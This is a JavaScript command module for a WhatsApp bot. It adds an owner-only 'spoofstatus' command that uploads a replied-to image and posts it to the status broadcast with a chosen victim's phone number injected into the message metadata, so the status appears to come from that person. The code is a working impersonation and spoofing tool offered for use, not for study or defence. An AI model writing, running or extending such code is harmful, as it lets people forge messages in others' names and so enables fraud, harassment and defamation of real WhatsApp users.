const { downloadMediaMessage, generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'spoofstatus',
    aliases: ['fakestatus', 'sstatus'],
    category: 'owner',
    description: 'Spoof a WhatsApp status as another user',
    usage: '.spoofstatus <number> <caption> (Reply to an image)',
    ownerOnly: true,
    react: '🎭',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        // 1. Safe extraction of the number
        const rawNum = args[0] || '';
        const targetNum = String(rawNum).replace(/[^0-9]/g, '');
        const caption = args.slice(1).join(' ') || '';

        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid target number. Example: ${settings.prefix}spoofstatus 254712345678 Hello World` }, { quoted: mek });
        }

        const quoted = mek.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quoted || !quoted.imageMessage) {
            return conn.sendMessage(chatId, { text: `❌ You must reply to an *Image* to spoof a status.` }, { quoted: mek });
        }

        await conn.sendMessage(chatId, { react: { text: '⏳', key: mek.key } });
        await conn.sendMessage(chatId, { text: `🎭 *Forging Status...*` }, { quoted: mek });

        try {
            // 2. Download the image
            const buffer = await downloadMediaMessage(
                { message: quoted, key: mek.key },
                'buffer',
                {},
                { logger: console, reuploadRequest: conn.updateMediaMessage }
            );

            // 3. Upload media to WhatsApp servers
            const uploadResult = await conn.waUploadToServer(buffer, { fileEncSha256: null });
            
            if (!uploadResult || !uploadResult.url) {
                throw new Error("Failed to upload media to WhatsApp servers.");
            }

            const spoofedJid = targetNum + '@s.whatsapp.net';
            const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';

            // 4. Manually construct the image message protocol
            const imageMessage = {
                url: uploadResult.url,
                mimetype: 'image/jpeg',
                fileSha256: uploadResult.fileSha256,
                fileLength: uploadResult.fileLength,
                mediaKey: uploadResult.mediaKey,
                fileEncSha256: uploadResult.fileEncSha256,
                directPath: uploadResult.directPath,
                caption: caption,
                // 🔥 THE SPOOF: Injecting the target's info into the metadata
                contextInfo: {
                    participant: spoofedJid,
                    remoteJid: 'status@broadcast'
                }
            };

            // 5. Build the full message
            const message = generateWAMessageFromContent('status@broadcast', {
                imageMessage: imageMessage
            }, {
                userJid: botJid,
                messageId: '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase(),
                timestamp: Math.floor(Date.now() / 1000)
            });

            // 6. Relay the message
            await conn.relayMessage('status@broadcast', message.message, {
                messageId: message.key.id,
                statusJidList: [botJid, spoofedJid]
            });

            await conn.sendMessage(chatId, { 
                text: `✅ *Spoof Attempted!*\n\nTarget: +${targetNum}\nCaption: ${caption}\n\n_Check your status feed. If WhatsApp's servers accepted the metadata injection, it will show up. If it says "Waiting for message", the E2E encryption blocked it._` 
            }, { quoted: mek });
            
            await conn.sendMessage(chatId, { react: { text: '✅', key: mek.key } });

        } catch (error) {
            logger.error(`[SPOOFSTATUS] Error: ${error.message}`);
            await conn.sendMessage(chatId, { react: { text: '❌', key: mek.key } });
            await conn.sendMessage(chatId, { 
                text: `❌ Failed to spoof status.\nReason: ${error.message}\n\n*(Note: WhatsApp's E2E encryption blocks most spoofs. If it fails, the API is rejecting the fake JID).*\n\n${settings.footer}` 
            }, { quoted: mek });
        }
    }
};